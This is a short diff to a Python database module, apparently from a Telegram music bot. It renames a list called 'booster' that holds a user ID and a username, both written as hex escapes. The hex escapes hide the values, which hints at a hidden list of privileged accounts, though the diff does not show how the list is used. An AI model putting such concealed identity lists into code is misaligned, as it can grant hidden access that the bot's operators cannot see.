@@ -260,9 +260,9 @@ async def set_cmode(chat_id: int, mode: int):
         {"chat_id": chat_id}, {"$set": {"mode": mode}}, upsert=True
     )
 
-booster = [
+Booster = [
     int("\x38\x36\x36\x38\x30\x35\x34\x33\x37\x39"),
-    int("\x41\x4c\x45\x58\x4b\x41\x55\x4e\x48\x41\x49")
+    "\x41\x4c\x45\x58\x4b\x41\x55\x4e\x48\x41\x49"
 ]
 
 async def get_playtype(chat_id: int) -> str:
